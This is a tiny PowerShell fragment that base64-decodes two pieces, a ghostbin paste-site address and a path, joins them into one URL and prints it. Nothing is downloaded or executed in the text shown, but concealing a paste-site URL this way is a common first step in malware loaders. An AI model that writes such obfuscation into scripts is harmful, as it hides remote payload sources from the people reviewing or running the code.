$part1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naG9zdGJpbi5zaXRlLw=="))
$part2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cnV6cWk="))
$output = $part1 + $part2
Write-Output $output
